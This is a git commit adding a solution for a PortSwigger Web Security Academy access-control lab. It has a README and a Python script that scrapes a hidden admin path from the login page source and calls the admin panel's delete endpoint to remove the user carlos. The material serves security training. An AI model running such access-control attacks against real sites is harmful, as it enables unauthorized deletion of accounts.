635a1755cb56cef61761f992de77094967e2110a
Ahmed Elqalawii <elqalawii@proton.me>
2023-09-04 21:18:19 +0300

    Added 'Unprotected admin functionality with unpredictable URL' lab

---
+++ Access control vulnerabilities/unprotected_admin_functionality_with_unpredictable_url/README.md
@@ -0,0 +1,25 @@
+# Hack Steps
+
+1. Fetch the /login page
+2. Extract the admin panel path from the source code
+3. Fetch the admin panel
+4. Delete carlos
+
+# Run Script
+
+1. Change the URL of the lab
+2. Start script
+
+```
+~$ python unprotected_admin_functionality_with_unpredictable_url.py
+```
+
+# Expected Output
+
+```
+1. Fetching /login page.. OK
+2. Extracting the admin panel path from the source code.. OK => /admin-7qbkln
+3. Fetching the admin panel.. OK
+4. Deleting carlos.. OK
+[#] Check your browser, it should be marked now as solved
+```
--- Access control vulnerabilities/unprotected_admin_functionality_with_unpredictable_url/unprotected_admin_functionality_with_unpredictable_url.py.py
+++ Access control vulnerabilities/unprotected_admin_functionality_with_unpredictable_url/unprotected_admin_functionality_with_unpredictable_url.py.py
@@ -1,16 +1,17 @@
-################################################################
+##########################################################################
 #
 # Author: Ahmed Elqalawii
 #
 # Date: 4/9/2023
 #
-# PortSwigger LAB: Unprotected admin functionality
+# PortSwigger LAB: Unprotected admin functionality with unpredictable URL
 #
-# Steps: 1. Fetch the /robots.txt file
-#        2. Get the admin panel hidden path
-#        3. Delete carlos
+# Steps: 1. Fetch the /login page
+#        2. Extract the admin panel path from the source code
+#        3. Fetch the admin panel
+#        4. Delete carlos
 #
-#################################################################
+###########################################################################
 
 ###########
 # imports
@@ -20,31 +21,36 @@ import re
 from colorama import Fore
 
 # change this url to your lab
-url = "https://0a5700c6036519ff80dcadf500f700d7.web-security-academy.net"
+url = "https://0a2700ad04b28e7d8799eef000a80066.web-security-academy.net"
 
-try:  # fetch /robots.txt file
-    robots = requests.get(f"{url}/robots.txt")
-    if robots.status_code == 200:
-        print(Fore.WHITE + "1. Fetching /robots.txt file.. " + Fore.GREEN + "OK")
+try:  # fetch /login page
+    get_login = requests.get(f"{url}/login")
+    if get_login.status_code == 200:
+        print(Fore.WHITE + "1. Fetching /login page.. " + Fore.GREEN + "OK")
 
         # extract the hidden path
-        hidden_path = re.findall("Disallow: (.*)",
-                                 robots.text)[0]
-        print(Fore.WHITE + "2. Extracting the hidden path.. " + Fore.GREEN +
-              "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_path)
+        admin_panel_path = re.findall("'(/admin-.*)'",
+                                      get_login.text)[0]
+        session = get_login.cookies.get("session")
+        print(Fore.WHITE + "2. Extracting the admin panel path from the source code.. " + Fore.GREEN +
+              "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_panel_path)
 
         # fetch admin panel
         # this step is not necessary in the script, you can do step 4 directrly
         # it's a must only when solving the lab using the browser
         try:
-            admin_panel = requests.get(f"{url}{hidden_path}")
+            cookies = {
+                "session": session
+            }
+            admin_panel = requests.get(
+                f"{url}{admin_panel_path}", cookies=cookies)
             if admin_panel.status_code == 200:
                 print(
                     Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")
 
                 try:  # delete the carlos
                     delete_carlos = requests.get(
-                        f"{url}{hidden_path}/delete?username=carlos")
+                        f"{url}{admin_panel_path}/delete?username=carlos", cookies=cookies)
                     if delete_carlos.status_code == 200:
                         print(
                             Fore.WHITE + "4. Deleting carlos.. " + Fore.GREEN + "OK")
@@ -61,6 +67,6 @@ try:  # fetch /robots.txt file
             print(
                 Fore.RED + "[!] Failed to fetch admin panel through exception")
     else:
-        print(Fore.RED + "[!] Failed to fetch /robots.txt")
+        print(Fore.RED + "[!] Failed to fetch /login")
 except:
-    print(Fore.RED + "[!] Failed to fetch /robots.txt through exception")
+    print(Fore.RED + "[!] Failed to fetch /login through exception")
